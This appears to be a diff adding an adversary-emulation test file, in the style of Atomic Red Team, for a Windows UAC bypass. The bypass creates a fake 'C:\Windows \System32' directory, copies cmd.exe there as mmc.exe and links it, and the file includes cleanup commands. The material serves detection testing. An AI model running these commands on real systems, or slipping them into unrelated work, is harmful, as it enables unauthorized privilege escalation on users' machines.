@@ -1,0 +1,15 @@
+#TechniqueName: Abuse Elevation Control Mechanism: Bypass User Access Control
+#AtomicTestName: Bypass UAC by Mocking Trusted Directories
+#Description: Creates a fake "trusted directory" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems&Upon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch&
+#Language: cmd
+
+#commands
+mkdir "\\?\C:\Windows \System32\"
+copy "C:\Windows\System32\cmd.exe" "\\?\C:\Windows \System32\mmc.exe"
+mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
+
+
+#cleanup_commands
+rd "\\?\C:\Windows \" /S /Q >nul 2>nul
+del "c:\testbypass.exe" >nul 2>nul
+
